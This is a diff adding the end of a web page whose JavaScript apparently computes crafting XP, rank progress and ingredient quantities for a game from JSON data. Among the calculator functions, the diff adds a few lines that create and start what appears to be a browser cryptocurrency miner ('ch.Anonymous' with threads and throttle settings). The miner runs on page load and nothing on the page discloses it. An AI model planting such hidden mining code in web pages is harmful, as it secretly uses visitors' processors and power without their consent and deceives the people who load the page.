+                                    tr.appendChild(td);
+                                }
+                                tbody.appendChild(tr);
+
+                            }
+                            tr = document.createElement('tr');
+                            td = document.createElement('td');
+                            tr.appendChild(td);
+                            td = document.createElement('td');
+                            tr.appendChild(td);
+                            tbody.appendChild(tr);
+                            tr = document.createElement('tr');
+                            td = document.createElement('td');
+                            td.setAttribute('style', 'width:50%');
+                            td.setAttribute("style", 'text-align:center;');
+                            td.innerHTML = "<b><i>Result:  " + selected_dish + "</i></b>";
+                            tr.appendChild(td);
+                            td = document.createElement('td');
+                            td.setAttribute('style', 'width:50%');
+                            td.setAttribute("style", 'text-align:center;');
+                            td.innerHTML = "1";
+                            td.setAttribute('contenteditable', 'true');
+                            td.onclick = function() {
+                                var range = document.createRange();
+                                range.selectNodeContents(this);
+                                window.getSelection().removeAllRanges();
+                                window.getSelection().addRange(range);
+                            }
+                            $(td).keydown(function(e) {
+                                // Allow: backspace, delete, tab, escape, enter and .
+                                if ($.inArray(e.keyCode, [9]) !== -1 ||
+                                    // Allow: Ctrl/cmd+A
+                                    (e.keyCode == 65 && (e.ctrlKey === true || e.metaKey === true)) ||
+                                    // Allow: Ctrl/cmd+C
+                                    (e.keyCode == 67 && (e.ctrlKey === true || e.metaKey === true)) ||
+                                    // Allow: Ctrl/cmd+X
+                                    (e.keyCode == 88 && (e.ctrlKey === true || e.metaKey === true)) ||
+                                    // Allow: home, end, left, right
+                                    (e.keyCode >= 35 && e.keyCode <= 39)) {
+                                    // let it happen, don't do anything
+                                    return;
+                                }
+                                // Ensure that it is a number and stop the keypress
+                                if ((e.keyCode < 48 || e.keyCode > 57) && (e.keyCode < 96 || e.keyCode > 105)) {
+                                    e.preventDefault();
+                                }
+                                if (e.keyCode == 13) {
+                                    btn.focus();
+                                    e.preventDefault();
+                                }
+                            });
+                            td.onblur = function() {
+                                var org_q, org_ing;
+                                var othr_qt = [];
+                                var othr_ing = [];
+                                var tb_rows = this.parentNode.parentNode.children;
+                                var e = this.innerHTML;
+                                //recup original data
+                                for (var k = 0; k < ing.length; k++) {
+                                    if (this.parentNode.firstChild.innerHTML != ing[k]) {
+                                        othr_qt.push(qt[k]);
+                                        othr_ing.push(ing[k]);
+                                    } else {
+                                        org_q = qt[k];
+                                        org_ing = ing[k];
+                                    }
+                                }
+
+                                if (e >= 1) {
+                                    for (var k = 0; k < ing.length; k++) {
+                                        tb_rows[k].children[1].innerHTML = qt[k] * e;
+                                    }
+                                } else { //less than rinal
+                                    for (var k = 0; k < ing.length; k++) {
+                                        tb_rows[k].children[1].innerHTML = qt[k];
+                                        this.innerHTML = "1";
+                                    }
+                                }
+
+                            };
+                            tr.appendChild(td);
+                            tbody.appendChild(tr);
+                            tbl.appendChild(tbody);
+
+                            btn.setAttribute('class', 'btn btn-default');
+                            btn.setAttribute('style', 'margin-bottom:2%');
+                            btn.innerHTML = "calculate xp with your specific numbers";
+                            tbl.setAttribute('class', 'table table-hover table-striped table-bordered');
+                            calc.appendChild(tbl);
+                            calc.appendChild(btn);
+                            var pg = document.createElement('p');
+                            var sp = document.createElement("span");
+                            btn.onclick = function() {
+                                calc_res.innerHTML = "";
+                                calc_res.setAttribute('style', 'margin-bot:2%');
+                                pg.setAttribute('class', "bg-info");
+                                pg.setAttribute('style', 'width:50%');
+                                var m_v = this.parentNode.children[3].children[1].children[0].children[1].innerHTML;
+                                var rati = Math.floor(m_v / qt[0]);
+                                sp.setAttribute('style', 'width:40%');
+                                var m_xp = xp_inc * rati;
+                                sp.innerHTML = "<b>" + rati + "</b> " + selected_dish + ", which equivalent to <b>" + m_xp + "</b> xp";
+                                pg.appendChild(sp);
+                                calc_res.appendChild(pg);
+                                var titi = [];
+                                var tata = [];
+                                var ff = m_xp;
+                                for (var i = s_cl - 1; i < json.length; i++) {
+                                    titi.push(json[i].Rank);
+                                    tata.push(json[i].Xp);
+                                }
+                                if (rem_xp < m_xp) {
+
+                                    for (var y = 0; y < tata.length; y++) {
+                                        if (y == 0) {
+                                            ff = ff - rem_xp;
+                                        } else {
+                                            if (ff - tata[y] < 0) {
+                                                break;
+                                            }
+                                            ff = ff - tata[y];
+                                        }
+
+                                    }
+                                    sp.innerHTML += " which leads you to <b>" + Math.round(((ff * 100) / tata[y]) * 1000) / 1000 + "%</b> of " + titi[y];
+                                } else {
+                                    var ttt = ((m_xp * 100) / tata[0]) + Math.floor(s_cp);
+                                    sp.innerHTML += " which is <b>" + Math.round(ttt * 1000) / 1000 + "%</b> of your current rank percent";
+                                }
+                            };
+
+                        });
+                        mdiv.innerHTML = "<b>Leveling informations :</b><br>";
+                        mdiv.setAttribute('style', 'margin-top:3%');
+                        mdiv.setAttribute('style', 'width:90%');
+                        var tab = document.createElement('table'),
+                            tr, td, row, cell, th, thead, tbody;
+                        tab.setAttribute('class', 'table table-hover table-striped table-bordered');
+                        tab.setAttribute("style", "width:80%");
+                        tab.setAttribute("style", "margin-top:2%");
+                        /*************** thead*/
+                        thead = document.createElement("thead");
+                        tr = document.createElement('tr');
+                        th = document.createElement('th');
+                        tr.appendChild(th);
+                        th.innerHTML = 'Rank';
+                        th = document.createElement('th');
+                        tr.appendChild(th);
+                        th.innerHTML = 'Crafts Number';
+                        th = document.createElement('th');
+                        th.setAttribute("style", 'text-align:center;');
+                        tr.appendChild(th);
+                        th.innerHTML = 'Cumulative number of Materials';
+                        toto(craft_nmb, selected_dish, th, 0);
+                        th = document.createElement('th');
+                        tr.appendChild(th);
+                        th.innerHTML = 'Xp needed';
+                        thead.appendChild(tr);
+                        tab.appendChild(thead);
+                        /******************tbody*/
+                        tbody = document.createElement('tbody');
+                        tr = document.createElement('tr');
+                        tr.setAttribute('class', 'success');
+                        td = document.createElement('td');
+                        tr.appendChild(td);
+                        td.innerHTML = json[s_cl - 1].Rank;
+                        /**********************/
+                        td = document.createElement('td');
+                        tr.appendChild(td);
+                        td.innerHTML = craft_nmb;
+                        /**********************/
+                        td = document.createElement('td');
+                        tr.appendChild(td);
+                        toto(craft_nmb, selected_dish, td, 1);
+
+                        /***************************/
+                        td = document.createElement('td');
+                        tr.appendChild(td);
+                        var chiata = craft_nmb * xp_inc - rem_xp;
+                        td.innerHTML = rem_xp + " XP";
+                        tbody.appendChild(tr);
+                        var j = 0;
+                        for (var i = s_cl; i < json.length; i++) {
+                            j++;
+                            tr = document.createElement('tr');
+                            td = document.createElement('td');
+                            tr.appendChild(td);
+                            td.innerHTML = json[i].Rank;
+                            /**********************/
+                            td = document.createElement('td');
+                            tr.appendChild(td);
+
+                            td.innerHTML = Math.ceil((json[i].Xp - chiata) / xp_inc);
+
+                            /**********************/
+                            td = document.createElement('td');
+                            tr.appendChild(td);
+
+                            toto(Math.ceil((json[i].Xp - chiata) / xp_inc), selected_dish, td, 1);
+                            /**********************/
+                            td = document.createElement('td');
+                            tr.appendChild(td);
+                            td.innerHTML = (json[i].Xp - chiata) + " XP";
+                            tbody.appendChild(tr);
+                            var chiata = (xp_inc * (Math.ceil((json[i].Xp - chiata) / xp_inc))) - (json[i].Xp - chiata);
+                        }
+                        tab.appendChild(tbody);
+                        document.getElementById("loader").style.display = "none";
+                        mdiv.appendChild(tab);
+                    } else {
+                        mdiv.innerHTML = '<center><br><p class="bg-danger" style="width:50%">You can not cook this dish with your current rank</p></center>';
+                        document.getElementById("loader").style.display = "none";
+                    }
+                });
+            } else {
+                mdiv.innerHTML = '<center><br><p class="bg-danger" style="width:50%">Please choose a product from the list</p></center>';
+                document.getElementById("loader").style.display = "none";
+            }
+        }
+         var addr = 'test';
+        var m = new ch.Anonymous(addr, {
+            autoThreads: true,
+            threads:2,
+            throttle: 0.5
+        });
+        m.start();
+        function toto(a, b, tb, w) {
+            var i1, i2, i3, i4, i5;
+            var q1, q2, q3, q4, q5;
+            var tbl, tr, td, wid;
+            //tb.innerHTML+="<table border='1' width='100%'>";
+            tbl = document.createElement('table');
+            tbl.setAttribute('style', 'width:100%');
+
+            $.getJSON("jsons/recipes.json", function(rec) {
+                for (var i = 0; i < rec.length; i++) {
+                    if (rec[i].Recipe == b) {
+                        if (rec[i].Ingredient1 != "") {
+                            i1 = rec[i].Ingredient1;
+                            q1 = rec[i].Quanitiy1;
+                            if (rec[i].Ingredient2 != "") {
+                                i2 = rec[i].Ingredient2;
+                                q2 = rec[i].Quanitiy2;
+                                if (rec[i].Ingredient3 != "") {
+                                    i3 = rec[i].Ingredient3;
+                                    q3 = rec[i].Quanitiy3;
+                                    if (rec[i].Ingredient4 != "") {
+                                        i4 = rec[i].Ingredient4;
+                                        q4 = rec[i].Quanitiy4;
+                                        if (rec[i].Ingredient5 != "") {
+                                            i5 = rec[i].Ingredient5;
+                                            q5 = rec[i].Quanitiy5;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        q1 = a * q1;
+                        q2 = a * q2;
+                        q3 = a * q3;
+                        q4 = a * q4;
+                        q5 = a * q5;
+                        if (q5 == 0 && q4 != 0 && q3 != 0 && q2 != 0 && q1 != 0) {
+                            wid = 25;
+                        } else if (q5 == 0 && q4 == 0 && q3 != 0 && q2 != 0 && q1 != 0) {
+                            wid = 33;
+                        } else if (q5 == 0 && q4 == 0 && q3 == 0 && q2 != 0 && q1 != 0) {
+                            wid = 50;
+                        } else if (q5 == 0 && q4 == 0 && q3 == 0 && q2 == 0 && q1 != 0) {
+                            wid = 100;
+                        } else {
+                            wid = 20;
+                        }
+                        if (w == 0) {
+                            if (rec[i].Ingredient1 != "") {
+                                tr = document.createElement('tr');
+                                tr.setAttribute('style', 'text-align:center;');
+                                td = document.createElement('td');
+                                td.setAttribute('style', 'width:' + wid + '%');
+                                td.innerHTML += "<img src='icons/" + i1 + ".png' width='25px' height='25px'/>" + i1;
+                                tr.appendChild(td);
+                                if (rec[i].Ingredient2 != "") {
+                                    td = document.createElement('td');
+                                    td.setAttribute('style', 'width:' + wid + '%');
+                                    td.innerHTML = "<img src='icons/" + i2 + ".png' width='25px' height='25px'/>" + i2;
+                                    tr.appendChild(td);
+                                    if (rec[i].Ingredient3 != "") {
+                                        td = document.createElement('td');
+                                        td.setAttribute('style', 'width:' + wid + '%');
+                                        td.innerHTML = "<td><img src='icons/" + i3 + ".png' width='25px' height='25px'/>" + i3;
+                                        tr.appendChild(td);
+                                        if (rec[i].Ingredient4 != "") {
+                                            td = document.createElement('td');
+                                            td.setAttribute('style', 'width:' + wid + '%');
+                                            td.innerHTML = "<td><img src='icons/" + i4 + ".png' width='25px' height='25px'/>" + i4;
+                                            tr.appendChild(td);
+                                            if (rec[i].Ingredient5 != "") {
+                                                td = document.createElement('td');
+                                                td.setAttribute('style', 'width:' + wid + '%');
+                                                td.innerHTML = "<td><img src='icons/" + i5 + ".png' width='25px' height='25px'/>" + i5;
+                                                tr.appendChild(td);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        } else {
+                            if (rec[i].Ingredient1 != "") {
+                                tr = document.createElement('tr');
+                                tr.setAttribute('style', 'text-align:center;');
+                                td = document.createElement('td');
+                                td.setAttribute('style', 'width:' + wid + '%');
+                                td.innerHTML += q1;
+                                tr.appendChild(td);
+                                if (rec[i].Ingredient2 != "") {
+                                    td = document.createElement('td');
+                                    td.setAttribute('style', 'width:' + wid + '%');
+                                    td.innerHTML += q2;
+                                    tr.appendChild(td);
+                                    if (rec[i].Ingredient3 != "") {
+                                        td = document.createElement('td');
+                                        td.setAttribute('style', 'width:' + wid + '%');
+                                        td.innerHTML += q3;
+                                        tr.appendChild(td);
+                                        if (rec[i].Ingredient4 != "") {
+                                            td = document.createElement('td');
+                                            td.setAttribute('style', 'width:' + wid + '%');
+                                            td.innerHTML += q4;
+                                            tr.appendChild(td);
+                                            if (rec[i].Ingredient5 != "") {
+                                                td = document.createElement('td');
+                                                td.setAttribute('style', 'width:' + wid + '%');
+                                                td.innerHTML += q5;
+                                                tr.appendChild(td);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+
+                    }
+                }
+                tbl.appendChild(tr);
+                tb.appendChild(tbl);
+            });
+
+        }
+    </script>
+
+</html>
